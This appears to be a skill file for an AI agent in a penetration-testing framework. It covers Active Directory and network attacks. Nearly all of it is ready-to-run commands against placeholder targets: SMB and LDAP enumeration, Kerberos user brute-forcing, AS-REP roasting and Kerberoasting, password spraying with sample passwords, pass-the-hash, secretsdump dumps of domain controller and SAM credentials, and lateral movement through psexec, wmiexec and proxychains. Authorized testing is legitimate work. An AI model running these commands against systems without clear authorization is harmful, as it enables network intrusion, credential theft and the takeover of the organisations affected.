---
name: infrastructure
description: Infrastructure and network testing — SMB, LDAP, AD, Kerberos, SSH, FTP enumeration
allowed-tools: [Bash, Read, Write]
---

# Infrastructure Testing

Test network services, Active Directory, and protocol-level vulnerabilities.

## Tools

| Tool | Purpose |
|------|---------|
| nmap | Port scan + NSE scripts |
| enum4linux-ng | SMB/LDAP enumeration |
| crackmapexec | Multi-protocol network attack |
| impacket suite | SMB, Kerberos, WMI, DCOM exploitation |
| ldapsearch | LDAP directory enumeration |
| smbclient | SMB file share access |
| kerbrute | Kerberos user enumeration + brute force |

## Network Discovery

```bash
nmap -sV -sC -T4 --open TARGET_RANGE -oN OUTPUT_DIR/recon/nmap-infra.txt
nmap --script vuln TARGET_RANGE -oN OUTPUT_DIR/recon/nmap-vulns-infra.txt
nmap -p 88,389,445,135,3389,5985 TARGET_RANGE -oN OUTPUT_DIR/recon/nmap-ad-ports.txt
```

## SMB Enumeration

```bash
# Null session
enum4linux-ng -A -oJ OUTPUT_DIR/recon/enum4linux.json TARGET_IP
smbclient -L TARGET_IP -N
smbmap -H TARGET_IP

# With credentials
crackmapexec smb TARGET_IP -u '' -p '' --shares
crackmapexec smb TARGET_IP -u 'guest' -p '' --shares
crackmapexec smb TARGET_RANGE -u users.txt -p passwords.txt --no-brute
```

## LDAP Enumeration

```bash
# Anonymous bind
ldapsearch -x -H ldap://TARGET_IP -b "dc=domain,dc=com" 2>/dev/null | head -50

# Authenticated
ldapsearch -x -H ldap://TARGET_IP -D "user@domain.com" -w "password" \
  -b "dc=domain,dc=com" "(objectClass=user)" | tee OUTPUT_DIR/recon/ldap-users.txt
```

## Kerberos Attacks

```bash
# User enumeration (no credentials required)
kerbrute userenum /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt \
  --dc TARGET_IP -d domain.com -o OUTPUT_DIR/recon/kerbrute-users.txt

# AS-REP Roasting (accounts without pre-auth)
impacket-GetNPUsers domain.com/ -dc-ip TARGET_IP -no-pass -usersfile OUTPUT_DIR/recon/kerbrute-users.txt \
  -outputfile OUTPUT_DIR/artifacts/asrep-hashes.txt

# Kerberoasting (accounts with SPNs)
impacket-GetUserSPNs domain.com/user:password -dc-ip TARGET_IP \
  -outputfile OUTPUT_DIR/artifacts/kerberoast-hashes.txt
```

## Password Spraying

```bash
crackmapexec smb TARGET_IP -u OUTPUT_DIR/recon/kerbrute-users.txt -p "Winter2024!" --continue-on-success
crackmapexec smb TARGET_IP -u OUTPUT_DIR/recon/kerbrute-users.txt -p "Company123!" --continue-on-success
```

## Pass-the-Hash

```bash
# Once hash obtained from secretsdump/mimikatz output
crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH --local-auth
impacket-psexec administrator@TARGET_IP -hashes :NTLM_HASH
```

## Secrets Extraction

```bash
# Domain controller
impacket-secretsdump domain/user:password@TARGET_DC_IP -outputfile OUTPUT_DIR/artifacts/dcsync

# Local machine (if admin)
impacket-secretsdump -sam /path/SAM -system /path/SYSTEM LOCAL
```

## Multi-Target Lateral Movement Tracking

When an engagement spans multiple hosts (pivot chains), record each hop in session-memory so context survives session resets.

```bash
# After compromising HOST_A and obtaining credentials for HOST_B:
# 1. Record the pivot in memory
python3 tools/session-memory.py note "$OUTPUT_DIR" \
  "PIVOT: $(hostname) → HOST_B_IP via pass-the-hash (NTLM: HASH_HERE) using crackmapexec"

# 2. Initialise a linked engagement for HOST_B
eval $(python3 tools/init-engagement.py \
  --type Network \
  --project "$(basename $(dirname $OUTPUT_DIR))-pivot" \
  --target HOST_B_IP \
  --scope HOST_B_IP \
  --mode graybox 2>/dev/null | grep "^export OUTPUT_DIR")
PIVOT_DIR="$OUTPUT_DIR"

# 3. Record the pivot source in the new engagement
python3 tools/session-memory.py note "$PIVOT_DIR" \
  "SOURCE: reached via pivot from ORIGINAL_TARGET using credential NTLM:HASH"

# 4. Continue testing HOST_B from PIVOT_DIR
# Executors spawn with the new OUTPUT_DIR context

# 5. After testing HOST_B, load both contexts to see full chain
python3 tools/session-memory.py search "PIVOT" | head -20
```

**Lateral movement command patterns:**

```bash
# SMB lateral movement
crackmapexec smb HOST_B_IP -u administrator -H NTLM_HASH --local-auth
impacket-wmiexec DOMAIN/user@HOST_B_IP -hashes :NTLM_HASH

# SSH from compromised Linux pivot
ssh -i "$OUTPUT_DIR/artifacts/id_rsa" user@HOST_B_IP
# Or via Chisel SOCKS5 proxy already established
proxychains4 ssh user@HOST_B_IP

# Document the full kill chain
cat >> "$OUTPUT_DIR/attack-chain.md" << EOF

## Lateral Movement Chain
| Hop | From | To | Method | Credential |
|-----|------|----|--------|------------|
| 1 | Attacker | HOST_A_IP | Exploitation | N/A |
| 2 | HOST_A_IP | HOST_B_IP | Pass-the-Hash | NTLM:HASH |
| 3 | HOST_B_IP | DC_IP | Kerberoasting | krbtgt hash |
EOF
```

## Output

All findings → `OUTPUT_DIR/findings/finding-NNN/`
Credential dumps → `OUTPUT_DIR/artifacts/` (never commit to git)
Pivot chain notes → `session-memory.py note` + `attack-chain.md`
